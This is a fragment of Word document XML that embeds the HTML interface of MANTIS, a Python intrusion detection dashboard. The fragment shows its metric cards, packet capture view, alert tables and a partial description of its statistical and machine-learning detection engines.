    <w:p w14:paraId="6833126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class="chart-container"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A5674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&lt;canvas id="cpuChartCanvas"&gt;&lt;/canvas&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31D1859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4DFDC5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1B98017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class="card" style="border-top: 3px solid var(--accent-purple);"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="317CD3E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class="card-header" style="justify-content: space-between; align-items: center; display:flex;"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CD9013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&lt;span&gt;Host memory use&lt;/span&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C1017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&lt;svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="204F8F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stroke-width="2"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="274F70A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&lt;rect x="2" y="3" width="20" height="14" rx="2" ry="2"&gt;&lt;/rect&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DA155D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&lt;/svg&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2166E2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02FF1C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class="metric-value"&gt;&lt;span id="memVal"&gt;0.0&lt;/span&gt;&lt;span class="metric-unit"&gt;%&lt;/span&gt;&lt;/div&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FF74F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class="chart-container"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DACDCE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&lt;canvas id="memChartCanvas"&gt;&lt;/canvas&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BA3A8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2088844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30483BB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class="card top-acc-green"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E27A8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class="card-header"&gt;Sensors online &lt;svg width="14" height="14" viewBox="0 0 24 24" fill="none"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3280F23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stroke="currentColor" stroke-width="2"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17D7F6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&lt;rect x="2" y="2" width="20" height="8" rx="2" ry="2"&gt;&lt;/rect&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="531D34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&lt;/svg&gt;&lt;/div&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2265FE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class="metric-value"&gt;&lt;span id="sensorVal"&gt;0&lt;/span&gt;&lt;/div&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DE721A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class="metric-meta"&gt;&lt;span class="state-dot"&gt;&lt;/span&gt;Seen within the last 60 seconds&lt;/div&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6702434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5CDCE00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class="card top-acc-red"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="208C2E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class="card-header"&gt;Threat events &lt;svg width="14" height="14" viewBox="0 0 24 24"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CF25D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fill="none" stroke="currentColor" stroke-width="2"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3907167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&lt;path</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FF4A0E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d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46CD8C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&lt;/path&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="568353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&lt;/svg&gt;&lt;/div&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0720674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class="metric-value"&gt;&lt;span id="totalEventsVal"&gt;0&lt;/span&gt;&lt;/div&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0125E2C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class="metric-meta alert"&gt;&lt;span class="state-dot"&gt;&lt;/span&gt;Current in-memory event window&lt;/div&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="257904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2EAF263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10596D9A" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="51CE5A7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class="section-heading"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74715B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3BC41B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&lt;h2&gt;Detection activity&lt;/h2&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D5C05A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&lt;p&gt;Latest classified events and engine output&lt;/p&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E528D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4013BD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506B526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class="overview-grid"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4045BAB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class="table-card"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E191B9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class="table-header table-header-split"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3444DF5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&lt;div&gt;Recent events&lt;span class="table-kicker"&gt;Newest detections appear first&lt;/span&gt;&lt;/div&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5138611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&lt;span class="refresh-note"&gt;LIVE&lt;/span&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AF0DB4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051961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class="table-scroll"&gt;&lt;table&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39AB22F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&lt;thead&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7569B2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&lt;tr&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72FE38F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&lt;th&gt;Sev&lt;/th&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DDC66B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&lt;th&gt;Time&lt;/th&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B5D9EF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&lt;th&gt;Sensor &amp;larr; Source&lt;/th&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41A79E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&lt;th&gt;ATT&amp;amp;CK&lt;/th&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="567E465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&lt;th&gt;Risk&lt;/th&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="455DFB2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&lt;th&gt;Event Details&lt;/th&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41790F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&lt;/tr&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C478B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&lt;/thead&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FC87E1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&lt;tbody id="alertTableBody"&gt;&lt;/tbody&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="099A2D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&lt;/table&gt;&lt;/div&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AD20A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66EEBA39" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6F6B00B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class="table-card engine-panel"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="770818F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class="table-header"&gt;Detection engines&lt;span class="table-kicker"&gt;Events by analysis method&lt;/span&gt;&lt;/div&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CB1BE1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&lt;div class="engine-list"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19D5C7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class="engine-row"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="395C08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&lt;span class="engine-marker red"&gt;&lt;/span&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1ACB9A3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0FE6EFD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class="engine-name"&gt;Traffic anomaly&lt;/div&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="298CD59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class="engine-model"&gt;Z-Score, DDoS detection&lt;/div&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AEBCA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62B891B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class="engine-count" id="ddosCount"&gt;0&lt;/div&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DBA0F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45F5CB7B" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="018C188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class="engine-row"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7695F3F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&lt;span class="engine-marker orange"&gt;&lt;/span&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71BE48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2BE73AC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class="engine-name"&gt;Scan behaviour&lt;/div&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60C7020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class="engine-model"&gt;KNN and K-Means&lt;/div&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DA53A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56CFB0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class="engine-count" id="scanCount"&gt;0&lt;/div&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78B359F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138F6AC5" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7FFFBBC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class="engine-row"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10D4256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&lt;span class="engine-marker purple"&gt;&lt;/span&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35AAAA6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6F589CD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class="engine-name"&gt;Payload inspection&lt;/div&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3585D95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class="engine-model"&gt;Naive Bayes, application layer&lt;/div&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AF0CF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334E9DB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class="engine-count" id="payloadCount"&gt;0&lt;/div&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A0615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0670F887" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="36FB05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class="engine-row"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="570230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&lt;span class="engine-marker"&gt;&lt;/span&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A046A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666DA0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class="engine-name"&gt;IP reputation&lt;/div&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16B4FFA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class="engine-model"&gt;Bloom filter blacklist&lt;/div&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38BFF5D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3746387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class="engine-count" id="blacklistCount"&gt;0&lt;/div&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BF098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781EED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55921B0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6124F44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61BC1B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0885BF7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 &lt;!-- End of tab-overview --&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E0FB57E" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0BB2542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 TAB 2: WIRESHARK PACKETS --&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53532A8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id="tab-packets" class="tab-content" role="tabpanel"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3893F03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class="content-width"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E72252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class="page-intro"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C08EA9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&lt;h2&gt;Live packet capture&lt;/h2&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D1D7CE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&lt;p&gt;Packets are captured through Python raw sockets and stored temporarily in memory. Select a row to inspect the frame data or export the current buffer for independent analysis.&lt;/p&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F4C702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027816D0" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="540FE0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class="pkt-toolbar"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="001E14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&lt;input type="text" aria-label="Filter captured packets" placeholder="Filter by IP, port or packet details"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D09C5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oninput="setQueryFilter(this.value)"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AFA9E0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&lt;select onchange="setProtoFilter(this.value)"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B8CD8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&lt;option value="ALL"&gt;All protocols&lt;/option&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="056A84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&lt;option value="TCP"&gt;TCP&lt;/option&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="626C764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&lt;option value="UDP"&gt;UDP&lt;/option&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7603810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&lt;option value="ICMP"&gt;ICMP&lt;/option&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F7AAD1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&lt;/select&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="204EE50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&lt;button class="pkt-btn" id="pktPauseBtn" onclick="togglePause()"&gt;Pause&lt;/button&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DB62F9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&lt;label class="pkt-btn" style="cursor:default;"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="214D78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&lt;input type="checkbox" checked onchange="toggleAutoScroll(this)"&gt; Auto-scroll</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="341841E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&lt;/label&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21A4F6D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&lt;a class="pkt-btn primary" href="/api/export.pcap" download</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="509F3B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aria-label="Export .pcap (Wireshark)"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07C408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title="Download the live buffer as a libpcap file and open it in Wireshark"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0693327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&gt;Export PCAP&lt;/a&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5804A2D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&lt;a class="pkt-btn" href="/api/export" download&gt;Export JSON&lt;/a&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44E85C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&lt;span class="pkt-chip"&gt;TCP &lt;b id="pcTCP"&gt;0&lt;/b&gt;&lt;/span&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2142319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&lt;span class="pkt-chip"&gt;UDP &lt;b id="pcUDP"&gt;0&lt;/b&gt;&lt;/span&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03743B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&lt;span class="pkt-chip"&gt;ICMP &lt;b id="pcICMP"&gt;0&lt;/b&gt;&lt;/span&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D0859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&lt;span class="pkt-chip"&gt;PPS &lt;b id="ppsVal"&gt;0&lt;/b&gt;&lt;/span&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="644EF5B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&lt;span class="pkt-chip"&gt;Z-Score &lt;b id="zVal"&gt;0.00&lt;/b&gt;&lt;/span&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44353A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49239BCD" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="761CD64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class="table-card"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B55FE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class="table-header"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D1AB6D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style="background: #111827; border-bottom: 2px solid var(--accent-blue); display:flex; justify-content:space-between;"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44E4F43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&lt;span class="mono" style="font-size: 10px; color: var(--accent-blue);"&gt;AF_PACKET live capture&lt;/span&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E7A2F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&lt;span class="mono" style="font-size: 10px; color: var(--text-muted);"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5083310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buffered &lt;b id="pktBuffered" style="color:var(--accent-green)"&gt;0&lt;/b&gt; /</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53FC89B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total seen &lt;b id="pktTotal" style="color:var(--text-main)"&gt;0&lt;/b&gt;&lt;/span&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A3C50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16DCC39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id="pktScroll" style="max-height: 55vh; overflow-y: auto;"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E491B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&lt;table&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45BB6E8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&lt;thead&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="428CAE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&lt;tr&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A18D6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&lt;th width="5%"&gt;No.&lt;/th&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15FA913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&lt;th width="12%"&gt;Time&lt;/th&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48A12D7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&lt;th width="15%"&gt;Source&lt;/th&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A5A03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&lt;th width="15%"&gt;Destination&lt;/th&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A3994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&lt;th width="8%"&gt;Protocol&lt;/th&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E074A1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&lt;th width="8%"&gt;Length&lt;/th&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68B316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&lt;th&gt;Info&lt;/th&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="397D74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&lt;/tr&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CE7A8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&lt;/thead&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E41A7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&lt;tbody id="wsTableBody" style="background: #0f172a;"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37D57CE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&lt;tr&gt;&lt;td colspan="7" class="empty-state"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1424AE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&lt;strong&gt;Waiting for captured traffic&lt;/strong&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E58EA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&lt;span&gt;Packets matching the current filter will appear here.&lt;/span&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="142680B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&lt;/td&gt;&lt;/tr&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24249E8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&lt;/tbody&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BE2AE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&lt;/table&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="323F29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3C20CF8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51C67CB5" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="46AAFF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class="table-card" id="pktDetailCard" style="margin-top:16px; display:none;"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="291C743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class="table-header"&gt;Packet detail &lt;span class="table-kicker"&gt;Raw hexadecimal and ASCII representation&lt;/span&gt;&lt;/div&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43A411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&lt;pre id="pktDetail" class="hexdump"&gt;&lt;/pre&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0852075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4DF0BA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2726DA3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 &lt;!-- End of tab-packets --&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="188E07BC" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1BCB810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 TAB 3: ALERTS &amp; BLACKLIST --&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6921B93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id="tab-alerts" class="tab-content" role="tabpanel"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DCA69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class="content-width"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="694C0DB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class="page-intro"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25B600F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&lt;h2&gt;Threat activity log&lt;/h2&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="524ED5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&lt;p&gt;Review detected events, severity classifications, source hosts, risk scores and the corresponding MITRE ATT&amp;amp;CK technique where available.&lt;/p&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3562437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15C2A7D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class="table-card"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67AC94E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class="table-header table-header-split"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62D940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&lt;div&gt;All alerts&lt;span class="table-kicker"&gt;Up to 100 recent events held in memory&lt;/span&gt;&lt;/div&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="438E4A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&lt;span class="refresh-note"&gt;LIVE&lt;/span&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44DB2B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2715035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class="table-scroll" style="max-height: 600px;"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C2EFDB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&lt;table&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61C7799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&lt;thead&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C91883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&lt;tr&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3623ED2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&lt;th&gt;Sev&lt;/th&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B4D504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&lt;th&gt;Time&lt;/th&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="000D713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&lt;th&gt;Sensor &amp;larr; Source&lt;/th&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EBDE28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&lt;th&gt;ATT&amp;amp;CK&lt;/th&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75A896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&lt;th&gt;Risk&lt;/th&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FA2E0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&lt;th&gt;Message Log&lt;/th&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="068D6DA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&lt;/tr&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AB426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&lt;/thead&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C3271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&lt;tbody id="fullAlertTableBody"&gt;&lt;/tbody&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6632354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&lt;/table&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F329A3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43531D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669ACD3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5BBF423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 &lt;!-- End of tab-alerts --&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="535C419F" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="154E647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 TAB 4: ARCHITECTURE --&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B707A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id="tab-architecture" class="tab-content" role="tabpanel"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="252B861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class="content-width"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11C316B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class="doc-view"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="044B2A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&lt;h2&gt;MANTIS system design&lt;/h2&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52A91C1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class="project-summary"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CA706F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&lt;strong&gt;Minimalist Alert Network for Threat Intelligence System&lt;/strong&gt; is a host-based intrusion detection platform implemented with the Python standard library.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EC38B3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5EC1D557" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4D2242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&lt;h3&gt;Design objective&lt;/h3&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36581E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&lt;p&gt;MANTIS investigates whether common threat-detection methods can be implemented from first principles with no third-party runtime packages. The sensor captures frames at OSI Layer 2 through Linux AF_PACKET sockets, extracts network features and passes them through four focused detection engines.&lt;/p&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D9EDF71" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="02EEDC2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&lt;h3&gt;Detection pipeline&lt;/h3&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20807F7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class="architecture-grid"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CA5B9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class="arch-engine"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CBD6A0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&lt;span class="method-tag"&gt;Statistical analysis&lt;/span&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="099A873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&lt;strong&gt;Traffic anomaly detection&lt;/strong&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0841DA4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Measures packet rate against a running mean and standard deviation. Sustained observations above the configured threshold identify possible volumetric DDoS traffic.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="616021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3FE48798" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3D32B5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class="arch-engine"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D66DC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&lt;span class="method-tag"&gt;Behavioural analysis&lt;/span&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E376BF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&lt;strong&gt;Port-scan detection&lt;/strong&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F36793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Uses custom K-Nearest Neighbours and K-Means implementations to classify unusual port-access patterns associated with horizontal and vertical reconnaissance.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27D5F91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56C0EE32" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="427ED90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class="arch-engine"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17585B0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&lt;span class="method-tag"&gt;Payload classification&lt;/span&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33A8D69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&lt;strong&gt;Application-layer inspection&lt;/strong&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F3D176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Applies a Naive Bayes classifier to captured payload features to identify patterns associated with SQL injection and cross-site scripting attempts.</w:t>
      </w:r>
